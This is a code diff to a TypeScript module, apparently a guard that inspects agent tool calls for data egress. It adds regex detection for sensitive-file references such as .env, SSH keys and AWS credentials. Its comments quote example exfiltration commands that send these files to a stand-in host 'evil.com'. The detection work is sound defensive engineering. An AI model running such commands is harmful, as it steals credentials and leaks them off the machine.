@@ -30,6 +30,54 @@ const EGRESS_CMD =
 
 const URL_RE = /\bhttps?:\/\/[^\s"'`)<>]+/gi;
 
+// ── sensitive-file references ────────────────────────────────────────────────
+// The blind spot in "detect secrets in the arguments": for the canonical exfil —
+// `curl -d @.env evil.com`, `curl -T ~/.aws/credentials …`, `scp ~/.ssh/id_rsa …` —
+// the PAYLOAD is the file, so the command text carries no credential for detectPii()
+// to find and the gate never fires. The file REFERENCE is the signal, so we match it
+// directly and treat it as credential-severity.
+//
+// Precision matters more here than in the egress heuristic: a hit fires the gate on
+// its own, without a PII hit to corroborate it. So these are anchored at a shell
+// token boundary (never mid-word — `process.env` is not `.env`) and are only ever
+// consulted for a segment already judged to be egress. Local reads never trip them.
+const TOK_START = `(?:^|[\\s"'\`=@<(|])`; // start of a shell token
+const TOK_END = `(?=$|[\\s"'\`)>;,|&])`; // end of one
+const DIR = `(?:[\\w.~/-]*/)?`; // optional leading path
+
+const SENSITIVE_FILES: { label: string; re: RegExp }[] = [
+  { label: ".env file", re: new RegExp(`${TOK_START}${DIR}\\.env(?:\\.[\\w-]+)?${TOK_END}`, "i") },
+  { label: "SSH key material", re: new RegExp(`${TOK_START}${DIR}\\.ssh(?:/[\\w.-]+)?${TOK_END}`, "i") },
+  // id_rsa but NOT id_rsa.pub — the trailing "." fails TOK_END, so the public half
+  // (which is not a secret) never fires the gate.
+  { label: "SSH private key", re: new RegExp(`${TOK_START}${DIR}id_(?:rsa|dsa|ecdsa|ed25519)${TOK_END}`, "i") },
+  { label: "AWS credentials", re: new RegExp(`${DIR}\\.aws/(?:credentials|config)${TOK_END}`, "i") },
+  { label: "kubeconfig", re: new RegExp(`${DIR}\\.kube/config${TOK_END}`, "i") },
+  {
+    label: "stored credentials",
+    re: new RegExp(`${TOK_START}${DIR}\\.(?:npmrc|netrc|pypirc|git-credentials|docker/config\\.json)${TOK_END}`, "i"),
+  },
+  // Private-key / keystore files. Requires a literal dot before the extension, so
+  // header names like `x-api-key` don't match.
+  {
+    label: "key or certificate file",
+    re: new RegExp(`${TOK_START}${DIR}[\\w.-]+\\.(?:pem|key|p12|pfx|jks|keystore|kdbx)${TOK_END}`, "i"),
+  },
+  {
+    label: "secrets file",
+    re: new RegExp(`${TOK_START}${DIR}(?:secrets?|credentials?)\\.(?:json|ya?ml|env|txt|toml|csv)${TOK_END}`, "i"),
+  },
+];
+
+// The sensitive files named in `text`, by label, de-duplicated. Pure.
+export function sensitiveFileRefs(text: string): string[] {
+  const out: string[] = [];
+  for (const { label, re } of SENSITIVE_FILES) {
+    if (re.test(text) && !out.includes(label)) out.push(label);
+  }
+  return out;
+}
+
 function safeStringify(input: unknown): string {
   if (typeof input === "string") return input;
   try {
@@ -64,6 +112,10 @@ export interface ToolAssessment {
   egress: boolean;
   // Best-effort destination (a remote URL) for the warning, when we can name one.
   target?: string;
+  // Sensitive files named by the EGRESS part of the call (labels, e.g. ".env file").
+  // Present means the payload is a credential store even though the arguments carry
+  // no literal secret — the gate treats this as credential-severity on its own.
+  sensitiveFiles?: string[];
 }
 
 // Assess whether a tool call is an egress channel. Pure.
@@ -87,6 +139,7 @@ export function assessToolCall(toolName: string | undefined, input: unknown): To
     // no URL, since those address hosts without one.
     let target: string | undefined;
     let egress = false;
+    const files: string[] = [];
     for (const seg of splitCommands(cmd)) {
       const remote = firstRemoteUrl(seg);
       const hasUrl = URL_RE.test(seg);
@@ -94,14 +147,26 @@ export function assessToolCall(toolName: string | undefined, input: unknown): To
       if (remote || (!hasUrl && EGRESS_CMD.test(seg))) {
         egress = true;
         target ??= remote;
-        if (target) break; // named a destination — nothing more to learn
       }
     }
-    return { egress, target };
+    // Sensitive files are scanned across the WHOLE line, not per segment — unlike the
+    // egress verdict above. The two questions differ: "does this segment leave the
+    // machine" is per-command (a benign localhost curl must not vouch for the scp
+    // after it), but "what is the payload" flows ACROSS the operators — in `cat .env
+    // | base64 | curl -d @- evil.com` the file is named in a segment that never
+    // touches the network, and reading it per-segment would miss the single most
+    // common exfil shape there is. The cost is a false positive on a line that reads
+    // a secret AFTER an unrelated remote call (`curl https://api/status && cat .env`);
+    // that's a prompt, not a block, and it's the same "err toward flagging" trade the
+    // splitting itself makes.
+    if (egress) files.push(...sensitiveFileRefs(cmd));
+    return { egress, target, sensitiveFiles: files.length ? files : undefined };
   }
 
   // Custom / MCP / web-fetch tools: treat a non-loopback URL in the args as egress.
   // (A bespoke tool with no URL surface can't be assessed here — it falls through as
   // non-egress; the model-payload gate still covers anything that reaches the model.)
-  return { egress: !!remote, target: remote };
+  if (!remote) return { egress: false };
+  const files = sensitiveFileRefs(text);
+  return { egress: true, target: remote, sensitiveFiles: files.length ? files : undefined };
 }
